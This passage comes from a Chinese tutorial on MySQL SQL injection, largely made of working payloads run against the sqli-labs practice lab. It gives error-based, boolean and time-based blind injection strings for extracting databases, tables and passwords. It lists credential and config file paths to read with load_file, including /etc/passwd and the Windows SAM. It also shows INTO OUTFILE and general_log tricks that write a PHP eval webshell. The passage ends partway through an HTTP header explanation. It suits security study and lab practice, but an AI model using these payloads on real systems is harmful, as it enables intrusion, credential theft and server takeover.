DUAL;</code></pre><p>其中GET_LOCK()和RELEASE_LOCK()分别是两个函数，并且有参数和返回值，这里的DUAL是伪表，在Oracle中很常见，就是一个不存在的表，用来临时记录值的。</p><ul><li>GET_LOCK有两个参数，一个是key，就是根据这个参数进行加锁的，另一个是等待时间(s)，即获取锁失败后等待多久回滚事务。</li><li>这里假设连接A先GET_LOCK(“lock_test”, 10)，因为lock_test这个字段在之前没有加锁所以不需要等待，直接返回1，加锁成功。 然后连接B再GET_LOCK(“lock_test”, 10)，等待10s，若这期间没有释放这个字段的锁，则10s过后返回0，连接B加锁失败。 这里的问题就是这个加锁方式很危险，一旦加锁之后忘记释放，就会一直锁住这个字段，除非连接断开。尤其是第二个参数，千万不要理解成超时时间，并不是设置一个字段的锁，然后超过这个时间就自动释放了，这个是等待时间，即第二次对同一个字段加锁，等待多久然后返回。</li><li>这个RELEASE_LOCK就没什么好说的了，记得加锁之后释放就可以了，成功释放回返回1。</li></ul><p>在一个连接session中可以先锁定一个变量，例如：<code>select get_lock('aaa',1);</code></p><p>然后再通过另一个连接session，再次执行get_lock函数：<code>select get_lock('aaa',2);</code>，此时将产生2秒的延时。</p><pre class="language-none"><code class="language-none">//第一个连接mysql&gt; select get_lock('aaa',1);+-------------------+| get_lock('aaa',1) |+-------------------+|                 1 |+-------------------+1 row in set (0.00 sec)//打开另一个cmd  再次连接mysql，执行get_lock，发现延时mysql&gt; select get_lock('aaa',1);+-------------------+| get_lock('aaa',1) |+-------------------+|                 0 |+-------------------+1 row in set (1.00 sec)</code></pre><p>利用场景是有条件限制的：需要提供长连接。在<code>Apache+PHP</code>搭建的环境中需要使用<code>mysql_pconnect(打开一个到 MySQL 服务器的持久连接)</code>函数来连接数据库。在CTF中，只有出题人很刻意的使用这个函数，才暗示使用这个</p><p><strong>正则表达式</strong></p><p>正则匹配在匹配较长字符串单自由度比较高的字符串时，会有大量的回溯，造成较大的计算量</p><pre class="language-none"><code class="language-none">select rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b');mysql&gt; select rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b');+-------------------------------------------------------------+| rpad('a',4999999,'a') RLIKE concat(repeat('(a.*)+',30),'b') |+-------------------------------------------------------------+|                                                           0 |+-------------------------------------------------------------+1 row in set (2.94 sec)</code></pre><h3 id="基于报错的SQL-盲注"><a href="#基于报错的SQL-盲注" class="headerlink" title="基于报错的SQL 盲注"></a>基于报错的SQL 盲注</h3><p>报错注入在没法用union联合查询时用，但前提还是不能过滤一些关键的函数</p><p>报错注入就是利用了数据库的某些机制，认为的制造错误条件，使得查询结果能够 出现在错误信息中。</p><p>构造payload 让信息通过错误提示回显出来</p><pre class="language-none"><code class="language-none">select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2)) a from information_schema.columns group by a;</code></pre><p>参考：<a href="https://www.freebuf.com/column/235496.html">https://www.freebuf.com/column/235496.html</a></p><p><strong>floor()</strong></p><blockquote><p>floor(x)</p><p>返回小于或等于 x 的最大整数　　</p></blockquote><pre class="language-none"><code class="language-none">SELECT FLOOR(1.5) -- 返回1</code></pre><pre class="language-none"><code class="language-none">select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand()*2))a from information_schema.columns group by a;</code></pre><p>以上语句可以简化成如下的形式。</p><pre class="language-none"><code class="language-none">select count(*) from information_schema.tables group by concat(version(), floor(rand(0)*2))</code></pre><p>如果关键的表被禁用了，可以使用这种形式</p><pre class="language-none"><code class="language-none">select count(*) from (select 1 union select null unionselect !1) group by concat(version(),floor(rand(0)*2))</code></pre><p>如果rand 被禁用了可以使用用户变量来报错</p><pre class="language-none"><code class="language-none">select min(@a:=1) from information_schema.tables group by concat(password,@a:=(@a+1)%2)</code></pre><pre class="language-none"><code class="language-none">爆库select 1 from ( select count(*),(concat((select schema_name from information_schema.schemata limit0,1),’|’,floor(rand(0)*2)))x from information_schema.tables group by x )a;http://www.hackblog.cn/sql.php?id=1 and(select 1 from(select count(*),concat((select (select (SELECT distinctconcat(0x7e,schema_name,0x7e) FROM information_schema.schemata LIMIT 0,1)) from information_schema.tables limit0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)爆表select 1 from (select count(*),(concat((select table_name from information_schema.tables wheretable_schema=database() limit 0,1),’|’,floor(rand(0)*2)))x from information_schema.tables group by x)a;爆字段select 1 from (select count(*),(concat((select column_name from information_schema.columns wheretable_schema=database() and table_name=‘users’ limit 0,1),’|’,floor(rand(0)*2)))x from information_schema.tablesgroup by x)a;爆数据select 1 from (select count(*),(concat((select concat(name,’|’,passwd,’|’,birth) from users limit0,1),’|’,floor(rand(0)*2)))x from information_schema.tables group by x)a;select 1 from(select count(*),concat((select (select (SELECT concat(0x23,name,0x3a,passwd,0x23) FROM users limit0,1)) from information_schema.tables limit 3,1),floor(rand(0)*2))x from information_schema.tables group by x)a</code></pre><p><strong>几何函数</strong></p><pre class="language-none"><code class="language-none">GeometryCollection：id=1 AND GeometryCollection((select * from (select* from(select user())a)b))polygon()：id=1 AND polygon((select * from(select * from(select user())a)b))multipoint()：id=1 AND multipoint((select * from(select * from(select user())a)b))multilinestring()：id=1 AND multilinestring((select * from(select * from(select user())a)b))linestring()：id=1 AND LINESTRING((select * from(select * from(select user())a)b))multipolygon() ：id=1 AND multipolygon((select * from(select * from(select user())a)b))</code></pre><p><strong>不存在函数</strong></p><pre class="language-none"><code class="language-none">可以用来爆数据库select a();ERROR 1305 (42000): FUNCTION mysql.a does not exist</code></pre><p><strong>name_const()</strong></p><pre class="language-none"><code class="language-none">仅可取数据库版本信息select * from(select name_const(version(),0x1),name_const(version(),0x1))a;ERROR 1060 (42S21): Duplicate column name '5.5.29'</code></pre><p><strong>uuid相关函数</strong></p><pre class="language-none"><code class="language-none">适用版本：8.0.xmysql&gt; SELECT UUID_TO_BIN((SELECT password FROM users WHERE id=1));mysql&gt; SELECT BIN_TO_UUID((SELECT password FROM users WHERE id=1));</code></pre><p><strong>exp()</strong></p><blockquote><p>exp(int)</p><p>返回e的x次方</p><p>适用版本：版本在5.5.5~5.5.49</p></blockquote><pre class="language-none"><code class="language-none">select exp(~(select * FROM(SELECT USER())a));--其中，~符号为运算符，意思为一元字符反转，通常将字符串经过处理后变成大整数，再放到exp函 数内，得到的结果将超过mysql的double数组范围，从而报错输出。除了exp()之外，还有类似pow()之类的相似函数同样是可利用的，他们的原理相同。--double 数值类型超出范围--Exp()为以e 为底的对数函数；--ERROR 1690 (22003): DOUBLE value is out of range in 'exp(~((select 'root@localhost' from dual)))'如果是在适用版本之外：虽然也会报错，但是表名不会出来select !(select * from(select user())a)-~0;</code></pre><p><strong>exp、cot、pow、abs等可以报错</strong></p><pre class="language-none"><code class="language-none">select abs(99999e9999999); #可使用在报错的布尔盲注中ERROR 1367 (22007): Illegal double '99999e9999999' value found during parsingselect pow(1+(1=1),999999999999);mysql&gt; select pow(1+(1=1),999999999999);ERROR 1690 (22003): DOUBLE value is out of range in 'pow((1 + (1 = 1)),999999999999)'mysql&gt; select pow(1+(1=0),999999999999);+---------------------------+| pow(1+(1=0),999999999999) |+---------------------------+|                         1 |+---------------------------+1 row in set (0.00 sec)通过这种写法，可以实现报错注入select pow(1+(表达式),999999999999)表达式可以是盲注的形式，返回1或者0，通过报错将字符才出来其他函数用法类似exp临界值709exp(709+(1=0))</code></pre><p>可以参考exp 报错文章：<a href="http://www.cnblogs.com/lcamry/articles/5509124.html">http://www.cnblogs.com/lcamry/articles/5509124.html</a></p><pre class="language-none"><code class="language-none">select !(select * from (select user())x) -（ps:这是减号） ~0--bigint 超出范围；~0 是对0 逐位取反，很大的版本在5.5.5 及其以上</code></pre><p>可以参考文章bigint 溢出文章<a href="http://www.cnblogs.com/lcamry/articles/5509112.html">http://www.cnblogs.com/lcamry/articles/5509112.html</a></p><pre class="language-none"><code class="language-none">extractvalue(1,concat(0x7e,(select @@version),0x7e)) --mysql 对xml 数据进行查询和修改的xpath 函数，xpath 语法错误</code></pre><pre class="language-none"><code class="language-none">updatexml(1,concat(0x7e,(select @@version),0x7e),1) --mysql 对xml 数据进行查询和修改的xpath 函数，xpath 语法错误</code></pre><pre class="language-none"><code class="language-none">select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;--mysql 重复特性，此处重复了version，所以报错。</code></pre><p><strong>join using()注列名</strong></p><p>通过系统关键词join可建立两个表之间的内连接。</p><p>通过对想要查询列名的表与其自身建议内连接，会由于冗余的原因(相同列名存在)，而发生错误。</p><p>并且报错信息会存在重复的列名，可以使用USING 表达式声明内连接（INNER JOIN）条件来避免报错。</p><pre class="language-none"><code class="language-none">mysql&gt;select * from(select * from users a join (select * from users)b)c;mysql&gt;select * from(select * from users a join (select * from users)b using(username))c;mysql&gt;select * from(select * from users a join (select * from users)busing(username,password))c</code></pre><p><strong>GTID相关函数</strong></p><p>从MySQL 5.6.5 开始新增了一种基于GTID 的复制方式。通过GTID 保证了每个在主库上提交的事务在集群中有一个唯一的ID。这种方式强化了数据库的主备一致性，故障恢复以及容错能力。</p><p>GTID (Global Transaction ID)是全局事务ID,当在主库上提交事务或者被从库应用时，可以定位和追踪每一个事务，对DBA来说意义就很大了，我们可以适当的解放出来，不用手工去可以找偏移量的值了，而是通过CHANGE MASTER TO MASTER_HOST=’xxx’, MASTER_AUTO_POSITION=1的即可方便的搭建从库，在故障修复中也可以采用MASTER_AUTO_POSITION=‘X’的方式。</p><p>可能大多数人第一次听到GTID的时候会感觉有些突兀，但是从架构设计的角度，GTID是一种很好的分布式ID实践方式，通常来说，分布式ID有两个基本要求： 1）全局唯一性 2）趋势递增 这个ID因为是全局唯一，所以在分布式环境中很容易识别，因为趋势递增，所以ID是具有相应的趋势规律，在必要的时候方便进行顺序提取，行业内适用较多的是基于Twitter的ID生成算法snowflake,所以换一个角度来理解GTID，其实是一种优雅的分布式设计。</p><pre class="language-none"><code class="language-none">mysql&gt;select gtid_subset(user(),1);mysql&gt;select gtid_subset(hex(substr((select * from users limit1,1),1,1)),1);mysql&gt;select gtid_subtract((select * from(select user())a),1);</code></pre><p><strong>报错函数速查表</strong></p><p><strong>sqli-labs/less-5</strong></p><p><strong>一：盲注</strong></p><pre class="language-none"><code class="language-none">（1）利用left(database(),3)进行尝试http://127.0.0.1/sqli-labs/Less-5/?id=1' and left(version(),3)=5.7--+    接下来看一下数据库的长度http://127.0.0.1/sqli-labs/Less-5/?id=1' and length(database())=8--+    猜测数据库第一位http://127.0.0.1/sqllib/Less-5/?id=1'and left(database(),1)&gt;'a'--+    用此方法推测出其他几位（2）利用substr() ascii()函数进行尝试/left也可以，都行http://127.0.0.1/sqli-labs/Less-5/?id=1' and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;65 --+    用此方法推测出其他几位，得到第一个表名    接下来用limit 1,1得到第二个表名，以此类推（3）利用regexp 获取表中的列http://127.0.0.1/sqli-labs/Less-5/?id=1' and 1=(select 1 from information_schema.columns where table_name='users' and column_name regexp '^us[a-z]' limit 0,1)--+    用此方法推测出其他几位，得到列名（4）利用ord()和mid()函数获取users 表的内容http://127.0.0.1/sqli-labs/Less-5/?id=1' and ord(mid((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))=68--+    解释：    IFNULL(v1,v2):如果 v1 的值不为 NULL，则返回 v1，否则返回 v2。    CAST(x AS type)：转换数据类型    SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1    所以这句就是先从表users将username字段取出通过order by进行升序，取出第一行的数据，再cast将其转化为字    符类型，在通过IFNULL判断其里面的数据是否为空，不为空则返回其数据。以上（1）（2）（3）（4）我们通过使用不同的语句，通过布尔盲注SQL把所有的payload 进行演示了一次。想必通过实例更能够对sql 布尔盲注语句熟悉和理解了</code></pre><p><strong>二：报错注入</strong></p><pre class="language-none"><code class="language-none">（1）首先使用报错注入，利用count、floor、group by进行报错http://127.0.0.1/sqli-labs/Less-5/?id=1' union Select 1,count(*),concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2)) a from information_schema.columns group by a--+（2）利用double 数值类型超出范围进行报错注入http://127.0.0.1/sqli-labs/Less-5/?id=-1' union select (exp(~(select * FROM(SELECT USER())a))),2,3--+（3）利用bigint 溢出进行报错注入.http://127.0.0.1/sqli-labs/Less-5/?id=1' union select (!(select * from (select user())x) - ~0),2,3--+（4）xpath 函数报错注入http://127.0.0.1/sqli-labs/Less-5/?id=1' and extractvalue(1,concat(0x7e,(select @@version),0x7e))--+（5）updatexml 函数报错注入http://127.0.0.1/sqli-labs/Less-5/?id=1' and updatexml(1,concat(0x7e,(select @@version),0x7e),1)--+（6）利用数据的重复性http://127.0.0.1/sqli-labs/Less-5/?id=1'union select 1,2,3 from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x --+</code></pre><p><strong>updatexml()函数</strong></p><ul><li>updatexml（）是一个使用不同的xml标记匹配和替换xml块的函数。</li><li>作用：改变文档中符合条件的节点的值</li><li>语法： updatexml（XML_document，XPath_string，new_value） 第一个参数：是string格式，为XML文档对象的名称，文中为Doc 第二个参数：代表路径，Xpath格式的字符串例如//title【@lang】 第三个参数：string格式，替换查找到的符合条件的数据</li><li>updatexml使用时，当xpath_string格式出现错误，mysql则会爆出xpath语法错误（xpath syntax）</li><li>例如： select * from test where ide = 1 and (updatexml(1,0x7e,3)); 由于0x7e是~，不属于xpath语法格式，因此报出xpath语法错误。</li><li>适用版本: 5.1.5+</li></ul><pre class="language-none"><code class="language-none">select updatexml(1,concat(0x7e,(select user()),0x7e),1)ERROR 1105 (HY000): XPATH syntax error: '~root@localhost~'</code></pre><p><strong>extractvalue()函数</strong></p><ul><li>此函数从目标XML中返回包含所查询值的字符串 语法：extractvalue（XML_document，xpath_string） 第一个参数：string格式，为XML文档对象的名称 第二个参数：xpath_string（xpath格式的字符串） select * from test where id=1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)));</li><li>extractvalue使用时当xpath_string格式出现错误，mysql则会爆出xpath语法错误（xpath syntax）</li><li>select user,password from users where user_id=1 and (extractvalue(1,0x7e));</li><li>由于0x7e就是~不属于xpath语法格式，因此报出xpath语法错误。</li></ul><pre class="language-none"><code class="language-none">select extractvalue(1,concat(0x7e,(select user()),0x7e))ERROR 1105 (HY000): XPATH syntax error: '~root@localhost~'</code></pre><p><strong>三：延时注入</strong></p><pre class="language-none"><code class="language-none">（1）利用sleep()函数进行注入，当错误的时候会有5 秒的时间延时。http://127.0.0.1/sqli-labs/Less-5/?id=1'and If(ascii(substr(database(),1,1))=115,1,sleep(5))--+（2）利用BENCHMARK()进行延时注入http://127.0.0.1/sqli-labs/Less-5/?id=1'UNION SELECT (IF(SUBSTRING(current,1,1)=CHAR(115),BENCHMARK(50000000,ENCODE('MSG','by 5 seconds')),null)),2,3 FROM (select database() as current) as tb1--+当结果正确的时候，运行ENCODE('MSG','by 5 seconds')操作50000000 次，会占用一段时间。</code></pre><p>sqli-labs/Less-9的payload</p><pre class="language-none"><code class="language-none">--猜测数据库：http://127.0.0.1/sqli-labs/Less-9/?id=1'and If(ascii(substr(database(),1,1))=115,1,sleep(5))--+--说明第一位是s （ascii 码是115）http://127.0.0.1/sqli-labs/Less-9/?id=1'and If(ascii(substr(database(),2,1))=101,1,sleep(5))--+说明第一位是e （ascii 码是101）....以此类推，我们知道了数据库名字是security猜测security 的数据表：http://127.0.0.1/sqli-labs/Less-9/?id=1'and If(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 0,1),1,1))=101,1,sleep(5))--+猜测第一个数据表的第一位是e,...依次类推，得到emailshttp://127.0.0.1/sqli-labs/Less-9/?id=1'and If(ascii(substr((select table_name from information_schema.tables where table_schema='security' limit 1,1),1,1))=114,1,sleep(5))--+猜测第二个数据表的第一位是r,...依次类推，得到referers...再以此类推，我们可以得到所有的数据表emails,referers,uagents,users猜测users 表的列：http://127.0.0.1/sqli-labs/Less-9/?id=1'and If(ascii(substr((select column_name from information_schema.columns where table_name='users' limit 0,1),1,1))=105,1,sleep(5))--+猜测users 表的第一个列的第一个字符是i，以此类推，我们得到列名是id，username，password猜测username 的值：http://127.0.0.1/sqli-labs/Less-9/?id=1'and If(ascii(substr((select username from users limit 0,1),1,1))=68,1,sleep(5))--+猜测username 的第一行的第一位以此类推，我们得到数据库username，password 的所有内容以上的过程就是我们利用sleep()函数注入的整个过程，当然了可以离开BENCHMARK()函数进行注入</code></pre><h2 id="导入导出相关操作的讲解"><a href="#导入导出相关操作的讲解" class="headerlink" title="导入导出相关操作的讲解"></a>导入导出相关操作的讲解</h2><p>在了解导入导出相关操作时，先了解以下<code>Mysql</code>变量</p><h3 id="mysql变量"><a href="#mysql变量" class="headerlink" title="mysql变量"></a>mysql变量</h3><p>mysqld服务器维护两种变量。全局变量影响服务器的全局操作。会话变量影响具体客户端连接相关操作。</p><p>服务器启动时，将所有全局变量初始化为默认值。可以在选项文件或命令行中指定的选项来更改这些默认值。服务器启动后，通过连接服务器并执行<code>SET GLOBAL var_name</code>语句可以更改动态全局变量。要想更改全局变量，必须具有SUPER权限。</p><p>服务器还为每个客户端连接维护会话变量。连接时使用相应全局变量的当前值对客户端会话变量进行初始化。客户可以通过<code>SET SESSION var_name</code>语句来更改动态会话变量。设置会话变量不需要特殊权限，但客户可以只更改自己的会话变量，而不更改其它客户的会话变量。</p><p>可以通过<code>SHOW VARIABLES</code>语句查看系统变量及其值。</p><pre class="language-none"><code class="language-none">mysql&gt; SHOW VARIABLES;</code></pre><p>可以使用like语句来匹配和筛选。</p><p><strong>secure_file_priv</strong></p><blockquote><p><code>secure_file_priv</code>对读写文件有影响。 <code>secure-file-priv</code>参数是用来限制<code>LOAD DATA, SELECT ... OUTFILE, and LOAD_FILE()</code>传到哪个指定目录的。 当<code>secure_file_priv</code>的值为<code>null</code> ，表示限制<code>mysqld</code> 不允许导入|导出。默认是<code>null</code> 当<code>secure_file_priv</code>的值为<code>/tmp/</code> ，表示限制<code>mysqld</code> 的导入|导出只能发生在<code>/tmp/</code>目录 下 当<code>secure_file_priv</code>的值没有具体值时，表示不对<code>mysqld</code> 的导入|导出做限制</p></blockquote><h3 id="load-file-导出文件"><a href="#load-file-导出文件" class="headerlink" title="load_file()导出文件"></a>load_file()导出文件</h3><p>Load_file(file_name):读取文件并返回该文件的内容作为一个字符串。</p><blockquote><p><strong>使用条件：</strong> A、必须有权限读取并且文件必须完全可读</p><p>and (select count() from mysql.user)&gt;0 /* 如果结果返回正常,说明具有读写权限。</p><p>and (select count() from mysql.user)&gt;0 /* 返回错误，应该是管理员给数据库帐户降权</p><p>B、欲读取文件必须在服务器上</p><p>C、必须指定文件完整的路径</p><p>D、欲读取文件必须小于max_allowed_packet 如果该文件不存在，或因为上面的任一原因而不能被读出，函数返回空。比较难满足的就是权限，在windows 下，如果NTFS 设置得当，是不能读取相关的文件的，当遇到只有administrators 才能访问的文件，users 就别想load_file 出来。</p><p>在实际的注入中，我们有两个难点需要解决：</p><p>绝对物理路径 构造有效的畸形语句（报错爆出绝对路径）</p><p>在很多PHP 程序中，当提交一个错误的Query，如果display_errors = on，程序就会暴露WEB 目录的绝对路径，只要知道路径，那么对于一个可以注入的PHP 程序来说，整个服务器的安全将受到严重的威胁。</p></blockquote><h3 id="WINDOWS下"><a href="#WINDOWS下" class="headerlink" title="WINDOWS下:"></a>WINDOWS下:</h3><blockquote><p>c:/boot.ini //查看系统版本</p><p>c:/windows/php.ini //php配置信息</p><p>c:/windows/my.ini //MYSQL配置文件，记录管理员登陆过的MYSQL用户名和密码</p><p>c:/winnt/php.ini</p><p>c:/winnt/my.ini</p><p>c:\mysql\data\mysql\user.MYD //存储了mysql.user表中的数据库连接密码</p><p>c:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.ini //存储了虚拟主机网站路径和密码</p><p>c:\Program Files\Serv-U\ServUDaemon.ini</p><p>c:\windows\system32\inetsrv\MetaBase.xml 查看IIS的虚拟主机配置</p><p>c:\windows\repair\sam //存储了WINDOWS系统初次安装的密码</p><p>c:\Program Files\ Serv-U\ServUAdmin.exe //6.0版本以前的serv-u管理员密码存储于此</p><p>c:\Program Files\RhinoSoft.com\ServUDaemon.exe</p><p>C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere*.cif文件</p><p>//存储了pcAnywhere的登陆密码</p><p>c:\Program Files\Apache Group\Apache\conf\httpd.conf 或C:\apache\conf\httpd.conf //查看WINDOWS系统apache文件</p><p>c:/Resin-3.0.14/conf/resin.conf //查看jsp开发的网站 resin文件配置信息.</p><p>c:/Resin/conf/resin.conf /usr/local/resin/conf/resin.conf 查看linux系统配置的JSP虚拟主机</p><p>d:\APACHE\Apache2\conf\httpd.conf</p><p>C:\Program Files\mysql\my.ini</p><p>C:\mysql\data\mysql\user.MYD 存在MYSQL系统中的用户密码</p></blockquote><h3 id="LUNIX-UNIX-下"><a href="#LUNIX-UNIX-下" class="headerlink" title="LUNIX/UNIX 下:"></a>LUNIX/UNIX 下:</h3><blockquote><p>/usr/local/app/apache2/conf/httpd.conf //apache2缺省配置文件</p><p>/usr/local/apache2/conf/httpd.conf</p><p>/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置</p><p>/usr/local/app/php5/lib/php.ini //PHP相关设置</p><p>/etc/sysconfig/iptables //从中得到防火墙规则策略</p><p>/etc/httpd/conf/httpd.conf // apache配置文件</p><p>/etc/rsyncd.conf //同步程序配置文件</p><p>/etc/my.cnf //mysql的配置文件</p><p>/etc/redhat-release //系统版本</p><p>/etc/issue</p><p>/etc/issue.net</p><p>/usr/local/app/php5/lib/php.ini //PHP相关设置</p><p>/usr/local/app/apache2/conf/extra/httpd-vhosts.conf //虚拟网站设置</p><p>/etc/httpd/conf/httpd.conf或/usr/local/apche/conf/httpd.conf //查看linux APACHE虚拟主机配置文件</p><p>/usr/local/resin-3.0.22/conf/resin.conf //针对3.0.22的RESIN配置文件查看</p><p>/usr/local/resin-pro-3.0.22/conf/resin.conf //同上</p><p>/usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看</p><p>/etc/httpd/conf/httpd.conf或/usr/local/apche/conf /httpd.conf 查看linux APACHE虚拟主机配置文件</p><p>/usr/local/resin-3.0.22/conf/resin.conf 针对3.0.22的RESIN配置文件查看</p><p>/usr/local/resin-pro-3.0.22/conf/resin.conf 同上</p><p>/usr/local/app/apache2/conf/extra/httpd-vhosts.conf APASHE虚拟主机查看</p><p>/etc/sysconfig/iptables 查看防火墙策略</p><p>load_file(char(47)) 可以列出FreeBSD,Sunos系统根目录</p><p>replace(load_file(0×2F6574632F706173737764),0×3c,0×20)</p><p>replace(load_file(char(47,101,116,99,47,112,97,115,115,119,100)),char(60),char(32))</p></blockquote><p><strong>示例：</strong></p><pre class="language-none"><code class="language-none">Select load_file(‘/flag’);SELECT CONVERT(LOAD_FILE("/etc/passwd") USING utf8);</code></pre><pre class="language-none"><code class="language-none">Select 1,2,3,4,5,6,7,hex(replace(load_file(char(99,58,92,119,105,110,100,111,119,115,92,114,101,112,97,105,114,92,115,97,109))))利用hex()将文件内容导出来，尤其是smb文件时可以使用。-1 union select 1,1,1,load_file(char(99,58,47,98,111,111,116,46,105,110,105))Explain：“char(99,58,47,98,111,111,116,46,105,110,105)”就是“c:/boot.ini”的ASCII 代码-1 union select 1,1,1,load_file(0x633a2f626f6f742e696e69)Explain：“c:/boot.ini”的16 进制是“0x633a2f626f6f742e696e69”-1 union select 1,1,1,load_file(c:\\boot.ini)Explain:路径里的/用\\代替</code></pre><h3 id="文件导入到数据库-LOAD-DATA-INFILE"><a href="#文件导入到数据库-LOAD-DATA-INFILE" class="headerlink" title="文件导入到数据库(LOAD DATA INFILE)"></a>文件导入到数据库(LOAD DATA INFILE)</h3><p>LOAD DATA INFILE 语句用于高速地从一个文本文件中读取行，并装入一个表中。文件名称必须为一个文字字符串。</p><p>在注入过程中，我们往往需要一些特殊的文件，比如配置文件，密码文件等。当你具有数据库的权限时，可以将系统文件利用load data infile 导入到数据库中。</p><p><strong>示例：</strong></p><pre class="language-none"><code class="language-none">load data infile '/tmp/t0.txt' ignore into table t0 character set gbk fields terminated by '\t' lines terminated by '\n'</code></pre><p>将/tmp/t0.txt 导入到t0 表中，character set gbk 是字符集设置为gbk，fields terminated by 是每一项数据之间的分隔符，lines terminated by 是行的结尾符。</p><p>当错误代码是2 的时候的时候，文件不存在，错误代码为13 的时候是没有权限，可以考虑/tmp 等文件夹。 TIPS：我们从mysql5.7 的文档看到添加了load xml 函数，是否依旧能够用来做注入还需要验证。</p><h3 id="导入到文件-OUTFILE"><a href="#导入到文件-OUTFILE" class="headerlink" title="导入到文件(OUTFILE)"></a>导入到文件(OUTFILE)</h3><p>SELECT…..INTO OUTFILE ‘file_name’</p><p>可以把被选择的行写入一个文件中。该文件被创建到服务器主机上，因此您必须拥有FILE权限，才能使用此语法。file_name 不能是一个已经存在的文件。</p><blockquote><p>mysql中的配置文件secure_file_priv变量如果为NULL，则不能导入</p><p>[mysqld] secure_file_priv=”/“</p></blockquote><p>我们一般有两种利用形式： <strong>第一种直接将select 内容导入到文件中：</strong></p><pre class="language-none"><code class="language-none">Select version() into outfile “c:\\phpnow\\htdocs\\test.php”</code></pre><p>此处将<code>version()</code>替换成一句话，<code>\&lt;?php @eval($_post[“mima”])?&gt;</code></p><p>也即 <code>Select\&lt;?php @eval($_post[“mima”])?&gt; into outfile “c:\\phpnow\\htdocs\\test.php”</code> 直接连接一句话就可以了，其实在select 内容中不仅仅是可以上传一句话的，也可以上传很多的内容。</p><p><strong>第二种修改文件结尾：</strong></p><pre class="language-none"><code class="language-none">Select version() Into outfile “c:\\phpnow\\htdocs\\test.php” LINES TERMINATED BY 0x16 进制文件</code></pre><p>解释：通常是用<code>‘\r\n’</code>结尾，此处我们修改为自己想要的任何文件。同时可以用<code>FIELDS TERMINATED BY 16</code> 进制可以为一句话或者其他任何的代码，可自行构造。在<code>sqlmap</code> 中<code>os-shell</code> 采取的就是 这样的方式，具体可参考<code>os-shell</code> 分析文章：<a href="http://www.cnblogs.com/lcamry/p/5505110.html">http://www.cnblogs.com/lcamry/p/5505110.html</a> TIPS： （1）可能在文件路径当中要注意转义，这个要看具体的环境 （2）上述我们提到了<code>load_file()</code>,但是当前台无法导出数据的时候，我们可以利用下面的语句：</p><pre class="language-none"><code class="language-none">select load_file(‘c:\\wamp\\bin\\mysql\\mysql5.6.17\\my.ini’) into outfile‘c:\\wamp\\www\\test.php’</code></pre><p>可以利用该语句将服务器当中的内容导入到web 服务器下的目录，这样就可以得到数据了。上述my.ini 当中存在password 项（不过默认被注释），当然会有很多的内容可以被导出来，这个要平时积累。</p><p>类似的还有一个<code>dumpfile</code></p><pre class="language-none"><code class="language-none">select "&lt;?php phpinfo();?&gt;" into dumpfile "/tmp/1.php";outfile函数在将数据写到文件里时有特殊的格式转换，而dumpfile则保持原数据格式</code></pre><p>当<code>secure_file_priv</code>为<code>NULL</code>时</p><pre class="language-none"><code class="language-none">如果存在堆叠注入，当然由于是global变量，需要root权限set global general_log=on;set global general_log_file='C:/phpStudy/WWW/789.php';select '&lt;?php eval($_POST['a']) ?&gt;';</code></pre><p><strong>sqli-labs/Less-7</strong></p><pre class="language-none"><code class="language-none">--使用')) or 1=1--+进行注入http://127.0.0.1/sqli-labs/Less-7/?id=1')) or 1=1 --+（2）利用上述提到的文件导入的方式进行演示：http://127.0.0.1/sqli-labs/Less-7/?id=-1')) union select 1,2,3 into outfile "D:/phpstudy_pro/WWW/sqli-labs/outfile/less-7.txt"--+（3）直接将一句话木马导入进去，再用菜刀等webshell 管理工具连接即可http://127.0.0.1/sqli-labs/Less-7/?id=-1'))UNION SELECT 1,2,'&lt;?php @eval($_post[“mima”])?&gt;' into outfile "D:/phpstudy_pro/WWW/sqli-labs/outfile/less-7.php"--+（4）这里也可以到处数据库的内容</code></pre><h2 id="增删改函数介绍"><a href="#增删改函数介绍" class="headerlink" title="增删改函数介绍"></a>增删改函数介绍</h2><p>在对数据进行处理上，我们经常用到的是增删查改。接下来我们讲解一下mysql 的增删改。查就是我们上述总用到的select，这里就介绍了。</p><p>增加一行数据。</p><p><strong>Insert</strong></p><p><strong>删除</strong></p><blockquote><p>删除数据: delete from 表名; delete from 表名where id=1; 删除结构： 删数据库：drop database 数据库名; 删除表：drop table 表名; 删除表中的列:alter table 表名drop column 列名;</p><p><strong>修改</strong> 修改所有：updata 表名set 列名=’新的值，非数字加单引号’ ; 带条件的修改：updata 表名set 列名=’新的值，非数字加单引号’ where id=6;</p></blockquote><h2 id="HTTP-头部介绍"><a href="#HTTP-头部介绍" class="headerlink" title="HTTP 头部介绍"></a>HTTP 头部介绍</h2><p>在利用抓包工具进行抓包的时候，我们能看到很多的项，下面详细讲解每一项。 HTTP 头部详解 1、Accept：告诉WEB 服务器自己接受什么介质类型，*/* 表示任何类型，type/* 表示该类型下的所有子类型，type/sub-type。 2、Accept-Charset： 浏览器申明自己接收的字符集</p><p>Accept-Encoding： 浏览器申明自己接收的编码方法，通常指定压缩方法，是否支持压缩，支持什么压缩方法（gzip，deflate） Accept-Language：：浏览器申明自己接收的语言语言跟字符集的区别：中文是语言，中文有多种字符集，比如big5，gb2312，gbk 等等。 3、Accept-Ranges：WEB 服务器表明自己是否接受获取其某个实体的一部分（比如文件的一部分）的请求。bytes：表示接受，none：表示不接受。 4、Age：当代理服务器用自己缓存的实体去响应请求时，用该头部表明该实体从产生到现在经过多长时间了。 5、Authorization：当客户端接收到来自WEB 服务器的WWW-Authenticate 响应时，用该头部来回应自己的身份验证信息给WEB 服务器。 